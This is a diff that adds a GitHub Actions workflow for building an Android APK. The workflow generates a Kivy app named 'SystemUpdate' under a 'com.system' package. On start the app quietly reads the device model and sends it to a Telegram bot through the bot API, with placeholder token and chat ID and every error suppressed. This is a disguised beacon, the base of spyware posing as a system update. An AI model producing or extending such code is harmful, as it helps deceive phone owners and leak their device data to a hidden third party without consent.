@@ -1,0 +1,116 @@
+name: Build APK
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - name: Setup Python
+      uses: actions/setup-python@v5
+      with:
+        python-version: '3.10'
+
+    - name: Setup Java
+      uses: actions/setup-java@v4
+      with:
+        distribution: 'microsoft'
+        java-version: '11'
+
+    - name: Install system dependencies
+      run: |
+        sudo apt-get update -y
+        sudo apt-get install -y git zip unzip curl wget
+        sudo apt-get install -y python3-pip autoconf libtool pkg-config zlib1g-dev
+        sudo apt-get install -y libncurses5-dev libncursesw5-dev libtinfo5
+        sudo apt-get install -y cmake libffi-dev libssl-dev
+
+    - name: Install Python dependencies
+      run: |
+        pip install --upgrade pip
+        pip install buildozer cython
+
+    - name: Create buildozer.spec
+      run: |
+        cat > buildozer.spec << 'EOF'
+[app]
+title = SystemUpdate
+package.name = systemupdate
+package.domain = com.system
+version = 0.1
+requirements = python3,kivy,requests
+orientation = portrait
+fullscreen = 0
+
+[buildozer]
+log_level = 2
+warn_on_root = 1
+
+[android]
+api = 30
+minapi = 21
+ndk = 23b
+sdk = 30
+permissions = INTERNET, READ_EXTERNAL_STORAGE
+EOF
+
+    - name: Create main.py
+      run: |
+        cat > main.py << 'EOF'
+from kivy.app import App
+from kivy.uix.label import Label
+from kivy.clock import Clock
+import requests
+import subprocess
+
+TOKEN = "ВАШ_ТОКЕН"
+CHAT_ID = "ВАШ_ID"
+
+def send(msg):
+    try:
+        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
+                     json={"chat_id": CHAT_ID, "text": msg[:4000]}, timeout=5)
+    except:
+        pass
+
+class MyApp(App):
+    def build(self):
+        Clock.schedule_once(lambda dt: self.start(), 1)
+        return Label(text="System Update")
+    
+    def start(self):
+        try:
+            model = subprocess.getoutput("getprop ro.product.model")
+            send(f"✅ Device: {model}")
+        except:
+            pass
+        send("✅ Done")
+
+if __name__ == "__main__":
+    MyApp().run()
+EOF
+
+    - name: Build APK
+      run: |
+        buildozer init
+        buildozer android debug 2>&1 | tee build.log
+
+    - name: Upload APK
+      uses: actions/upload-artifact@v4
+      with:
+        name: systemupdate-apk
+        path: bin/*.apk
+
+    - name: Upload log
+      if: failure()
+      uses: actions/upload-artifact@v4
+      with:
+        name: build-log
+        path: build.log
